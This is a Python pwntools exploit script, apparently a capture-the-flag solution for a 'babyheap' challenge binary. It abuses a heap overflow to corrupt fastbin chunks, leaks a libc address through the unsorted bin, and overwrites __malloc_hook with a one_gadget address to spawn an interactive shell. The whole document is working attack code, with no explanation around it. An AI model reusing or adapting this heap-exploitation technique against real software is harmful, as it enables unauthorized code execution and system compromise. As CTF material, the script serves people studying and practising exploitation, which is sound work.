#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./babyheap"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Command: ",str(idx))

def add(length):
    opt(1)
    p.sendlineafter("Size: ",str(length))

def free(idx):
    opt(3)
    p.sendlineafter("Index: ",str(idx))

def edit(idx,length,content):
    opt(2)
    p.sendlineafter("Index: ",str(idx))
    p.sendlineafter("Size: ",str(length))
    p.sendafter("Content: ",str(content))

def show(idx):
    opt(4)
    p.sendlineafter("Index: ",str(idx))

# leak

add(0x10) # 0
add(0x10) # 1
add(0x10) # 2
add(0x10) # 3
add(0x80) # 4
add(0x20) # 5

free(2)
free(1)

payload = flat([
    0,0,
    0,0x21,
    p8(0x80)
    ])
edit(0,len(payload),payload)

payload = flat([
    "a"*0x10,
    0,0x21
    ])
edit(3,len(payload),payload)

add(0x10) # 1
add(0x10) # 2

payload = flat([
    "a"*0x10,
    0,0x91
    ])
edit(3,len(payload),payload)
free(4) # unsorted bin
show(2)
p.recvuntil("Content: \n")
offset = 0x3c4b78
libc_base = u64(p.recv(6).ljust(8,"\0")) - offset

one_offset = 0x4527a
one_addr = libc_base + one_offset

target = libc_base + libc.sym["__malloc_hook"] - 0x23

add(0x60) # 5
add(0x60) # 6
add(0x60) # 7
add(0x60) # 8
add(0x60) # 9

free(8)
free(7)
payload = flat([
    "a"*0x60,0,
    0x71,target
    ])
edit(6,len(payload),payload)

add(0x60)
add(0x60)

edit(8,0x13+8, "\x00"*3+p64(0x7ffff7a92ea0) + p64(0x7ffff7a92a70) + p64(one_addr))
add(0x10) # getshell
gdb.attach(p)

p.interactive()
